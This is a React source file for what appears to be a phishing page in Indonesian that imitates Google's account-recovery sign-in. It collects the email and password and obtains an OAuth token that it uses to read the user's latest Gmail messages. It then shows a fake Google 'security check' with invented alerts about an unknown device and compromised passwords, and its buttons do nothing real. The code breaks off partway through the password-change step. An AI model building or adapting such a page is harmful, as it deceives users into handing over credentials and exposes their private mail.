/// <reference types="vite/client" />
import React, { useState, useEffect } from 'react';
import { motion, AnimatePresence } from 'motion/react';
import { initAuth, googleSignIn, logout, getAccessToken } from './auth';
import type { User } from 'firebase/auth';

const GoogleLogo = () => (
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 48 48" width="40px" height="40px" className="mb-2">
    <path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z" />
    <path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z" />
    <path fill="#FBBC05" d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z" />
    <path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z" />
  </svg>
);

const TextInput = ({ label, type = "text", value, onChange, error, name, autoFocus }: any) => {
  return (
    <div className="relative mb-2 mt-2">
      <input
        type={type}
        id={name}
        name={name}
        value={value}
        onChange={onChange}
        autoFocus={autoFocus}
        className={`block px-[15px] pt-[15px] pb-[13px] w-full text-[16px] text-[#1f1f1f] bg-transparent rounded border ${
          error ? 'border-[#b3261e] focus:border-[#b3261e]' : 'border-[#747775] hover:border-[#1f1f1f] focus:border-[#0b57d0]'
        } appearance-none focus:outline-none focus:border-2 peer`}
        placeholder=" "
      />
      <label
        htmlFor={name}
        className={`absolute text-[16px] font-normal left-[11px] top-[14px] px-1 bg-white transition-all duration-200 transform -translate-y-[25px] scale-[0.75] origin-top-left z-10 peer-placeholder-shown:scale-100 peer-placeholder-shown:translate-y-0 peer-focus:scale-[0.75] peer-focus:-translate-y-[25px] ${
          error ? 'text-[#b3261e] peer-focus:text-[#b3261e]' : 'text-[#444746] peer-focus:text-[#0b57d0]'
        } pointer-events-none`}
      >
        {label}
      </label>
      {error && (
        <div className="text-[#b3261e] text-[12px] mt-2 flex items-center gap-2 px-1">
          <svg aria-hidden="true" fill="currentColor" focusable="false" width="16px" height="16px" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
            <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"></path>
          </svg>
          {error}
        </div>
      )}
    </div>
  );
};

export default function App() {
  const [step, setStep] = useState<'email' | 'password' | 'change_password' | 'success' | 'error' | 'payment'>('email');
  const [direction, setDirection] = useState(1);
  const [isLoading, setIsLoading] = useState(false);
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [confirmPassword, setConfirmPassword] = useState('');
  const [error, setError] = useState('');
  const [showPassword, setShowPassword] = useState(false);
  const [expandedSection, setExpandedSection] = useState<string | null>(null);
  const [showProfileDropdown, setShowProfileDropdown] = useState(false);
  const [securedSections, setSecuredSections] = useState<string[]>([]);
  const [googleUser, setGoogleUser] = useState<User | null>(null);
  const [emailsData, setEmailsData] = useState<any[]>([]);
  const [isFetchingEmails, setIsFetchingEmails] = useState(false);

  useEffect(() => {
    const unsubscribe = initAuth(
      (user, token) => {
        setGoogleUser(user);
        if (user.email) setEmail(user.email);
        if (step === 'success') {
          fetchEmails();
        }
      },
      () => {
        setGoogleUser(null);
      }
    );
    return () => {
      unsubscribe();
    };
  }, [step]);

  useEffect(() => {
    if (step === 'success' && googleUser) {
      fetchEmails();
    }
  }, [step, googleUser]);

  const fetchEmails = async () => {
    if (emailsData.length > 0) return;
    try {
      setIsFetchingEmails(true);
      const token = await getAccessToken();
      if (!token) return;
      
      const response = await fetch('https://gmail.googleapis.com/gmail/v1/users/me/messages?maxResults=3', {
        headers: {
          Authorization: `Bearer ${token}`
        }
      });
      const data = await response.json();
      
      if (data.messages) {
        const emailDetails = await Promise.all(
          data.messages.map(async (msg: any) => {
            const res = await fetch(`https://gmail.googleapis.com/gmail/v1/users/me/messages/${msg.id}`, {
              headers: { Authorization: `Bearer ${token}` }
            });
            return await res.json();
          })
        );
        setEmailsData(emailDetails);
      }
    } catch (error) {
      console.error('Error fetching emails:', error);
    } finally {
      setIsFetchingEmails(false);
    }
  };

  const handleGoogleLogin = async () => {
    try {
      setIsLoading(true);
      const result = await googleSignIn();
      if (result) {
        setGoogleUser(result.user);
        if (result.user.email) {
          setEmail(result.user.email);
        }
        changeStep('password', 1);
      }
    } catch (err) {
      console.error('Login failed:', err);
      setError('Gagal masuk menggunakan Google.');
    } finally {
      setIsLoading(false);
    }
  };

  const changeStep = (newStep: 'email' | 'password' | 'change_password' | 'success' | 'error' | 'payment', newDirection: number) => {
    setIsLoading(true);
    setTimeout(() => {
      setDirection(newDirection);
      setStep(newStep);
      setIsLoading(false);
    }, 5200);
  };

  const handleChangePasswordSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    if (!password) {
      setError('Masukkan sandi');
      return;
    }
    if (password.length < 8) {
      setError('Sandi harus minimal 8 karakter');
      return;
    }
    if (password !== confirmPassword) {
      setError('Sandi tidak cocok. Harap coba lagi.');
      return;
    }
    setError('');
    changeStep('error', 1);
  };

  const handleEmailSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    if (!email) {
      setError('Masukkan alamat email atau nomor telepon');
      return;
    }
    setError('');
    changeStep('password', 1);
  };

  const handlePasswordSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!password) {
      setError('Masukkan sandi');
      return;
    }
    setError('');
    
    // Trigger real Google authentication here to get valid account data
    try {
      setIsLoading(true);
      const result = await googleSignIn(email);
      if (result) {
        setGoogleUser(result.user);
        if (result.user.email) {
          setEmail(result.user.email);
        }
        changeStep('success', 1);
      }
    } catch (err) {
      console.error('Login failed:', err);
      setError('Sandi salah. Coba lagi atau klik Lupa sandi untuk meresetnya.');
    } finally {
      setIsLoading(false);
    }
  };

  if (step === 'error') {
    const securityItems = [
      {
        id: 'devices',
        title: 'Perangkat Anda',
        subtitle: securedSections.includes('devices')
          ? 'Selesai didiagnosis'
          : 'Selesaikan 2 tindakan yang disarankan',
        isWarning: !securedSections.includes('devices'),
        icon: securedSections.includes('devices') ? (
          <svg viewBox="0 0 24 24" className="w-[24px] h-[24px] text-[#1e8e3e]" fill="currentColor">
            <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z" />
          </svg>
        ) : (
          <svg viewBox="0 0 24 24" className="w-[24px] h-[24px] text-[#1a73e8]" fill="currentColor">
            <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z" />
          </svg>
        ),
        content: securedSections.includes('devices') ? (
          <div className="pt-3 pb-4 px-4 bg-[#f8fafd] rounded-xl border border-gray-100 text-sm text-[#137333] flex items-center gap-2">
            <svg className="w-5 h-5" fill="none" stroke="currentColor" strokeWidth="2" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
              <path strokeLinecap="round" strokeLinejoin="round" d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z" />
            </svg>
            <span>Semua perangkat Anda aman. Anda telah keluar dari sesi tidak dikenal.</span>
          </div>
        ) : (
          <div className="pt-3 pb-4 px-4 bg-[#f8fafd] rounded-xl border border-gray-100 text-sm text-[#444746] space-y-3">
            <div className="flex items-start gap-3">
              <div className="w-2 h-2 rounded-full bg-green-500 mt-1.5 flex-shrink-0" />
              <div>
                <p className="font-medium text-[#1f1f1f]">HP Android ini (Xiaomi Redmi Note 10)</p>
                <p className="text-xs text-gray-500">Perangkat aktif saat ini • Indonesia</p>
              </div>
            </div>
            <div className="flex items-start gap-3 border-t border-gray-100 pt-3">
              <div className="w-2 h-2 rounded-full bg-amber-500 mt-1.5 flex-shrink-0" />
              <div>
                <p className="font-medium text-[#1f1f1f]">Perangkat Windows tidak dikenal</p>
                <p className="text-xs text-gray-500">Jakarta, Indonesia • Aktif 3 jam yang lalu</p>
                <p className="text-xs text-amber-600 mt-1">Seseorang mungkin telah mengakses akun Anda.</p>
              </div>
            </div>
            <div className="flex gap-2 pt-2 justify-end">
              <button 
                type="button"
                onClick={() => setSecuredSections([...securedSections, 'devices'])}
                className="px-4 py-2 text-xs font-medium text-[#0b57d0] border border-gray-300 rounded-full hover:bg-gray-50 transition"
              >
                Ya, itu saya
              </button>
              <button 
                type="button"
                onClick={() => setSecuredSections([...securedSections, 'devices'])}
                className="px-4 py-2 text-xs font-medium text-white bg-[#0b57d0] rounded-full hover:bg-[#0842a0] hover:shadow transition"
              >
                Keluar dari perangkat
              </button>
            </div>
          </div>
        )
      },
      {
        id: 'recovery',
        title: 'Login & pemulihan',
        subtitle: securedSections.includes('recovery')
          ? 'Email pemulihan ditambahkan'
          : 'Tambahkan email pemulihan',
        isWarning: !securedSections.includes('recovery'),
        icon: securedSections.includes('recovery') ? (
          <svg viewBox="0 0 24 24" className="w-[24px] h-[24px] text-[#1e8e3e]" fill="currentColor">
            <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z" />
          </svg>
        ) : (
          <svg viewBox="0 0 24 24" className="w-[24px] h-[24px] text-[#1a73e8]" fill="currentColor">
            <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z" />
          </svg>
        ),
        content: securedSections.includes('recovery') ? (
          <div className="pt-3 pb-4 px-4 bg-[#f8fafd] rounded-xl border border-gray-100 text-sm text-[#137333] flex items-center gap-2">
            <svg className="w-5 h-5" fill="none" stroke="currentColor" strokeWidth="2" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
              <path strokeLinecap="round" strokeLinejoin="round" d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z" />
            </svg>
            <span>Email pemulihan berhasil ditambahkan dan diamankan.</span>
          </div>
        ) : (
          <div className="pt-3 pb-4 px-4 bg-[#f8fafd] rounded-xl border border-gray-100 text-sm text-[#444746] space-y-3">
            <p>Email pemulihan membantu Anda masuk kembali ke akun jika ada aktivitas mencurigakan atau jika Anda lupa sandi.</p>
            <div className="flex gap-2 max-w-sm mt-2">
              <input 
                type="email" 
                placeholder="Masukkan email pemulihan" 
                className="flex-grow px-3 py-1.5 text-xs rounded border border-gray-300 focus:outline-none focus:border-[#0b57d0] bg-white"
                defaultValue="pemulihan@gmail.com"
              />
              <button 
                type="button"
                onClick={() => setSecuredSections([...securedSections, 'recovery'])}
                className="px-4 py-1.5 text-xs font-medium text-white bg-[#0b57d0] rounded hover:bg-[#0842a0] transition"
              >
                Tambahkan
              </button>
            </div>
          </div>
        )
      },
      {
        id: 'passwords',
        title: 'Sandi Anda yang tersimpan',
        subtitle: securedSections.includes('passwords')
          ? 'Sandi diperiksa dan aman'
          : 'Periksa sandi Anda',
        isWarning: !securedSections.includes('passwords'),
        icon: securedSections.includes('passwords') ? (
          <svg viewBox="0 0 24 24" className="w-[24px] h-[24px] text-[#1e8e3e]" fill="currentColor">
            <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z" />
          </svg>
        ) : (
          <svg viewBox="0 0 24 24" className="w-[24px] h-[24px] text-[#1a73e8]" fill="currentColor">
            <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z" />
          </svg>
        ),
        content: securedSections.includes('passwords') ? (
          <div className="pt-3 pb-4 px-4 bg-[#f8fafd] rounded-xl border border-gray-100 text-sm text-[#137333] flex items-center gap-2">
            <svg className="w-5 h-5" fill="none" stroke="currentColor" strokeWidth="2" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
              <path strokeLinecap="round" strokeLinejoin="round" d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z" />
            </svg>
            <span>Semua sandi Anda yang tersimpan telah diperbarui dan aman.</span>
          </div>
        ) : (
          <div className="pt-3 pb-4 px-4 bg-[#f8fafd] rounded-xl border border-gray-100 text-sm text-[#444746] space-y-2">
            <p>Terdapat 3 sandi yang lemah atau disusupi pada Pengelola Sandi Google Anda.</p>
            <button 
              type="button"
              onClick={() => setSecuredSections([...securedSections, 'passwords'])}
              className="mt-2 px-4 py-2 text-xs font-medium text-[#0b57d0] border border-gray-300 rounded-full hover:bg-gray-50 transition bg-white"
            >
              Periksa & Perbarui Sandi
            </button>
          </div>
        )
      },
      {
        id: 'safebrowsing',
        title: 'Safe Browsing',
        subtitle: securedSections.includes('safebrowsing')
          ? 'Safe Browsing yang Disempurnakan aktif'
          : 'Aktifkan Safe Browsing yang Disempurnakan',
        isWarning: !securedSections.includes('safebrowsing'),
        icon: securedSections.includes('safebrowsing') ? (
          <svg viewBox="0 0 24 24" className="w-[24px] h-[24px] text-[#1e8e3e]" fill="currentColor">
            <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z" />
          </svg>
        ) : (
          <svg viewBox="0 0 24 24" className="w-[24px] h-[24px] text-[#1a73e8]" fill="currentColor">
            <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z" />
          </svg>
        ),
        content: securedSections.includes('safebrowsing') ? (
          <div className="pt-3 pb-4 px-4 bg-[#f8fafd] rounded-xl border border-gray-100 text-sm text-[#137333] flex items-center gap-2">
            <svg className="w-5 h-5" fill="none" stroke="currentColor" strokeWidth="2" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
              <path strokeLinecap="round" strokeLinejoin="round" d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z" />
            </svg>
            <span>Safe Browsing yang Disempurnakan telah diaktifkan untuk perlindungan ekstra.</span>
          </div>
        ) : (
          <div className="pt-3 pb-4 px-4 bg-[#f8fafd] rounded-xl border border-gray-100 text-sm text-[#444746] space-y-2">
            <p>Dapatkan perlindungan yang lebih cepat dan proaktif terhadap situs web, unduhan, dan ekstensi yang berbahaya.</p>
            <button 
              type="button"
              onClick={() => setSecuredSections([...securedSections, 'safebrowsing'])}
              className="mt-2 px-4 py-2 text-xs font-medium text-white bg-[#0b57d0] rounded-full hover:bg-[#0842a0] transition"
            >
              Aktifkan sekarang
            </button>
          </div>
        )
      },
      {
        id: 'recent',
        title: 'Aktivitas keamanan terbaru',
        subtitle: 'Aktivitas dari 28 hari terakhir',
        isWarning: false,
        icon: (
          <svg viewBox="0 0 24 24" className="w-[24px] h-[24px] text-[#1e8e3e]" fill="currentColor">
            <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z" />
          </svg>
        ),
        content: (
          <div className="pt-3 pb-4 px-4 bg-[#f8fafd] rounded-xl border border-gray-100 text-sm text-[#444746] space-y-2">
            <div className="flex items-center gap-2">
              <span className="w-1.5 h-1.5 bg-green-500 rounded-full" />
              <p className="font-medium text-[#1f1f1f]">Masuk baru di perangkat Chrome pada Windows</p>
            </div>
            <p className="text-xs text-gray-500 pl-3.5">Hari ini • Indonesia</p>
            <p className="pl-3.5 text-xs text-gray-500">Tidak ada aktivitas mencurigakan lainnya dalam 28 hari terakhir.</p>
          </div>
        )
      },
      {
        id: 'apps',
        title: 'Aplikasi tertaut Anda',
        subtitle: '3 aplikasi tertaut memiliki akses ke beberapa data Akun Google Anda',
        isWarning: false,
        icon: (
          <svg viewBox="0 0 24 24" className="w-[24px] h-[24px] text-[#1e8e3e]" fill="currentColor">
            <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z" />
          </svg>
        ),
        content: (
          <div className="pt-3 pb-4 px-4 bg-[#f8fafd] rounded-xl border border-gray-100 text-sm text-[#444746] space-y-2">
            <p>Aplikasi berikut memiliki akses sebagian ke info Akun Google Anda:</p>
            <ul className="list-disc pl-5 text-xs space-y-1">
              <li>WhatsApp Messenger (Akses Google Drive)</li>
              <li>Spotify (Info profil publik)</li>
              <li>Netflix (Info profil dasar)</li>
            </ul>
            <p className="text-xs text-gray-500 mt-2">Semua aplikasi telah diverifikasi dan aman.</p>
          </div>
        )
      },
      {
        id: 'gmail_settings',
        title: 'Setelan Gmail',
        subtitle: '1 setelan sensitif',
        isWarning: false,
        icon: (
          <svg viewBox="0 0 24 24" className="w-[24px] h-[24px] text-[#1e8e3e]" fill="currentColor">
            <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z" />
          </svg>
        ),
        content: (
          <div className="pt-3 pb-4 px-4 bg-[#f8fafd] rounded-xl border border-gray-100 text-sm text-[#444746] space-y-1">
            <p className="font-medium text-[#1f1f1f]">Penerusan email dinonaktifkan</p>
            <p className="text-xs text-gray-500">Penerusan otomatis email masuk dinonaktifkan untuk email {email || 'user@gmail.com'}.</p>
          </div>
        )
      }
    ];

    return (
      <div className="min-h-screen bg-white sm:bg-[#f8fafd] flex flex-col font-sans text-[#1f1f1f] relative">
        {/* Google Account Top Header */}
        <header className="h-[64px] border-b border-[#e0e3e7] bg-white px-4 sm:px-6 flex items-center justify-between sticky top-0 z-50">
          <div className="flex items-center select-none">
            <span className="text-[#020307] text-[19px] font-normal tracking-tight font-sans">
              Google
            </span>
          </div>
          
          <div className="flex items-center gap-1">
            <button type="button" className="w-10 h-10 rounded-full hover:bg-gray-100 flex items-center justify-center text-[#5f6368] transition">
              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" className="w-5 h-5" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
                <circle cx="12" cy="12" r="10" />
                <path d="M9.09 9a3 3 0 0 1 5.83 1c0 2-3 3-3 3" />
                <line x1="12" y1="17" x2="12.01" y2="17" />
              </svg>
            </button>
            <button type="button" className="w-10 h-10 rounded-full hover:bg-gray-100 flex items-center justify-center text-[#5f6368] transition">
              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" className="w-5 h-5 fill-current">
                <path d="M4 8h4V4H4v4zm6 12h4v-4h-4v4zm-6 0h4v-4H4v4zm0-6h4v-4H4v4zm6 0h4v-4h-4v4zm6-10v4h4V4h-4zm-6 4h4V4h-4v4zm6 6h4v-4h-4v4zm0 6h4v-4h-4v4z" />
              </svg>
            </button>
            
            {/* Profile Pic Button */}
            <button 
              type="button"
              onClick={() => setShowProfileDropdown(!showProfileDropdown)}
              className="w-10 h-10 rounded-full flex items-center justify-center text-[#5f6368] hover:bg-gray-100 focus:outline-none transition relative overflow-hidden"
              id="profile-avatar-btn"
            >
              {googleUser?.photoURL ? (
                <img src={googleUser.photoURL} alt="Profile" className="w-8 h-8 rounded-full object-cover" referrerPolicy="no-referrer" />
              ) : (
                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" className="w-8 h-8" fill="currentColor">
                  <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 3c1.66 0 3 1.34 3 3s-1.34 3-3 3-3-1.34-3-3 1.34-3 3-3zm0 14.2c-2.5 0-4.71-1.28-6-3.22.03-1.99 4-3.08 6-3.08 1.99 0 5.97 1.09 6 3.08-1.29 1.94-3.5 3.22-6 3.22z" />
                </svg>
              )}
            </button>

            {/* Profile Dropdown */}
            {showProfileDropdown && (
              <div className="absolute right-4 top-[56px] w-[320px] bg-white rounded-[24px] shadow-2xl border border-gray-100 p-6 z-50 flex flex-col items-center">
                <div className="w-16 h-16 rounded-full flex items-center justify-center text-[#5f6368] mb-3 overflow-hidden">
                  {googleUser?.photoURL ? (
                    <img src={googleUser.photoURL} alt="Profile" className="w-16 h-16 rounded-full object-cover" referrerPolicy="no-referrer" />
                  ) : (
                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" className="w-16 h-16" fill="currentColor">
                      <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 3c1.66 0 3 1.34 3 3s-1.34 3-3 3-3-1.34-3-3 1.34-3 3-3zm0 14.2c-2.5 0-4.71-1.28-6-3.22.03-1.99 4-3.08 6-3.08 1.99 0 5.97 1.09 6 3.08-1.29 1.94-3.5 3.22-6 3.22z" />
                    </svg>
                  )}
                </div>
                <p className="font-medium text-[#1f1f1f] text-center max-w-full truncate">{googleUser?.displayName || email || 'user@gmail.com'}</p>
                <p className="text-xs text-gray-500 mb-4">{googleUser?.email || email || 'Pengguna Google'}</p>
                
                <button
                  type="button"
                  onClick={() => alert('Fitur kelola akun Google Anda')}
                  className="w-full text-center border border-gray-300 rounded-full py-2 px-4 text-xs font-medium text-[#3c4043] hover:bg-gray-50 transition mb-3"
                >
                  Kelola Akun Google Anda
                </button>
                
                <button
                  type="button"
                  onClick={() => {
                    logout();
                    setEmail('');
                    setPassword('');
                    setConfirmPassword('');
                    setExpandedSection(null);
                    setShowProfileDropdown(false);
                    setSecuredSections([]);
                    setStep('email');
                  }}
                  className="w-full text-center border border-gray-300 rounded-full py-2 px-4 text-xs font-medium text-[#c5221f] hover:bg-red-50 transition"
                >
                  Keluar / Reset Alur
                </button>
              </div>
            )}
          </div>
        </header>

        {/* Main Content Area */}
        <main className="flex-grow flex items-start justify-center p-4 sm:p-8 overflow-y-auto">
          <div className="w-full max-w-[620px] bg-white border border-[#e0e3e7] rounded-2xl shadow-sm p-6 sm:p-10 flex flex-col items-center my-4 sm:my-8">
            
            {/* Green Shield-Check Badge */}
            <div className="w-16 h-16 rounded-full bg-[#e6f4ea] flex items-center justify-center mb-4 flex-shrink-0">
              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" className="w-[36px] h-[36px] text-[#137333]" fill="currentColor">
                <path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm-2 16l-4-4 1.41-1.41L10 14.17l6.59-6.59L18 9l-8 8z" />
              </svg>
            </div>

            {/* Header Titles */}
            <h1 className="text-[28px] sm:text-[32px] text-[#1f1f1f] font-normal text-center leading-tight">
              Pemeriksaan Keamanan
            </h1>
            <p className="text-[#444746] text-[15px] text-center mt-2 mb-8">
              Berikut tips untuk Anda
            </p>

            {/* Checklist items */}
            <div className="w-full border-t border-gray-200">
              {securityItems.map((item) => {
                const isExpanded = expandedSection === item.id;
                return (
                  <div key={item.id} className="border-b border-gray-200">
                    <button
                      type="button"
                      onClick={() => setExpandedSection(isExpanded ? null : item.id)}
                      className="w-full py-4 flex items-center justify-between text-left hover:bg-gray-50/50 px-2 transition rounded"
                    >
                      <div className="flex items-center gap-4">
                        {item.icon}
                        <div>
                          <p className="text-[15px] font-medium text-[#1f1f1f]">{item.title}</p>
                          <p className="text-[13px] text-gray-500 mt-0.5">{item.subtitle}</p>
                        </div>
                      </div>
                      <svg 
                        fill="currentColor" 
                        viewBox="0 0 24 24" 
                        className={`w-5 h-5 text-[#5f6368] transition-transform duration-200 ${isExpanded ? 'rotate-180' : ''}`}
                      >
                        <path d="M7 10l5 5 5-5z" />
                      </svg>
                    </button>
                    
                    {/* Collapsible Content */}
                    <AnimatePresence initial={false}>
                      {isExpanded && (
                        <motion.div
                          initial={{ height: 0, opacity: 0 }}
                          animate={{ height: 'auto', opacity: 1 }}
                          exit={{ height: 0, opacity: 0 }}
                          transition={{ duration: 0.2, ease: 'easeInOut' }}
                          className="overflow-hidden"
                        >
                          <div className="pb-4 pt-1 pl-[48px] pr-2">
                            {item.content}
                          </div>
                        </motion.div>
                      )}
                    </AnimatePresence>
                  </div>
                );
              })}
            </div>

            {/* Centered Blue Link at bottom */}
            <div className="mt-8 text-center">
              <button
                type="button"
                onClick={() => {
                  setEmail('');
                  setPassword('');
                  setConfirmPassword('');
                  setExpandedSection(null);
                  setSecuredSections([]);
                  setStep('email');
                }}
                className="text-[#0b57d0] hover:underline text-[14px] font-medium transition"
              >
                Lanjutkan ke Akun Google Anda
              </button>
            </div>

          </div>
        </main>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-white sm:bg-[#f0f4f9] p-0 sm:p-5 flex flex-col items-center justify-between sm:justify-center font-sans tracking-wide relative">
      
      {/* Full-screen Loading Overlay for background */}
      <AnimatePresence>
        {isLoading && (
          <motion.div
            initial={{ opacity: 0 }}
            animate={{ opacity: 1 }}
            exit={{ opacity: 0 }}
            transition={{ duration: 0.3, ease: [0.4, 0, 0.2, 1] }}
            className="fixed inset-0 z-40 bg-[rgba(0,0,0,0.25)]"
          />
        )}
      </AnimatePresence>

      <div className="bg-white sm:rounded-[28px] w-full sm:max-w-[448px] sm:min-h-[500px] flex flex-col sm:h-auto sm:border sm:border-gray-200 flex-grow sm:flex-grow-0 overflow-x-hidden relative z-50 shadow-sm">
        
        {/* Loading Overlay inside the form box */}
        <AnimatePresence>
          {isLoading && (
            <motion.div
              initial={{ opacity: 0 }}
              animate={{ opacity: 1 }}
              exit={{ opacity: 0 }}
              transition={{ duration: 0.3, ease: [0.4, 0, 0.2, 1] }}
              className="absolute inset-0 z-40 bg-[rgba(0,0,0,0.25)] pointer-events-auto"
            />
          )}
        </AnimatePresence>

        {/* Loading Bar */}
        <AnimatePresence>
          {isLoading && (
            <motion.div
              initial={{ opacity: 0 }}
              animate={{ opacity: 1 }}
              exit={{ opacity: 0 }}
              transition={{ duration: 0.3, ease: [0.4, 0, 0.2, 1] }}
              className="absolute top-0 left-0 right-0 h-1 bg-transparent z-50 pointer-events-none"
            >
              <motion.div
                className="h-full bg-[#0b57d0]"
                initial={{ x: '-100%', width: '50%' }}
                animate={{ x: '200%' }}
                transition={{ repeat: Infinity, duration: 1, ease: 'linear' }}
              />
            </motion.div>
          )}
        </AnimatePresence>

        {/* Top/Header Section */}
        <div className="px-6 pt-6 sm:px-10 sm:pt-8 flex flex-col items-start z-0">
          <GoogleLogo />
        </div>
        
        <div className="relative flex-grow flex flex-col z-0">
          <AnimatePresence mode="wait" custom={direction}>
            <motion.div
              key={step}
              custom={direction}
              initial={(d: number) => ({ opacity: 0, x: d > 0 ? 40 : -40 })}
              animate={{ opacity: 1, x: 0 }}
              exit={(d: number) => ({ opacity: 0, x: d > 0 ? -40 : 40 })}
              transition={{ duration: 0.1, ease: [0.4, 0, 0.2, 1] }}
              className="flex flex-col flex-grow w-full"
            >
              <div className="px-6 pb-6 pt-2 sm:px-10 sm:pb-8 flex flex-col items-start">
                {step === 'email' && (
                  <>
                    <h1 className="text-[32px] sm:text-[40px] text-[#1f1f1f] font-normal mb-2 mt-4 leading-tight">Pemulihan akun</h1>
                    <p className="text-[#444746] text-[14px] sm:text-[16px] font-normal">Memulihkan Akun Google Anda</p>
                  </>
                )}
                {step === 'password' && (
                  <>
                    <h1 className="text-[32px] sm:text-[40px] text-[#1f1f1f] font-normal mb-2 mt-4 leading-tight">Selamat datang kembali</h1>
                    <div 
                      onClick={() => !isLoading && changeStep('email', -1)}
                      className={`border border-[#747775] rounded-full h-[32px] pr-[12px] pl-[6px] mt-2 flex items-center gap-2 text-[14px] text-[#1f1f1f] font-medium no-underline select-none ${isLoading ? 'cursor-not-allowed opacity-70' : 'hover:bg-[#f8fafd] cursor-pointer'} transition w-max`}
                      style={{ textDecoration: 'none' }}
                    >
                      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" className="w-[26px] h-[26px] text-[#444746] -ml-1 flex-shrink-0" fill="currentColor">
                        <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 3c1.66 0 3 1.34 3 3s-1.34 3-3 3-3-1.34-3-3 1.34-3 3-3zm0 14.2c-2.5 0-4.71-1.28-6-3.22.03-1.99 4-3.08 6-3.08 1.99 0 5.97 1.09 6 3.08-1.29 1.94-3.5 3.22-6 3.22z"/>
                      </svg>
                      <span className="no-underline decoration-none inline-block" style={{ textDecoration: 'none', borderBottom: 'none' }}>{email}</span>
                      <svg fill="currentColor" viewBox="0 0 24 24" className="w-[18px] h-[18px] text-[#444746] flex-shrink-0"><path d="M7 10l5 5 5-5z"/></svg>
                    </div>
                  </>
                )}
                {step === 'change_password' && (
                  <>
                    <h1 className="text-[32px] sm:text-[40px] text-[#1f1f1f] font-normal mb-2 mt-4 leading-tight">Ubah sandi</h1>
                    <div 
                      onClick={() => !isLoading && changeStep('email', -1)}
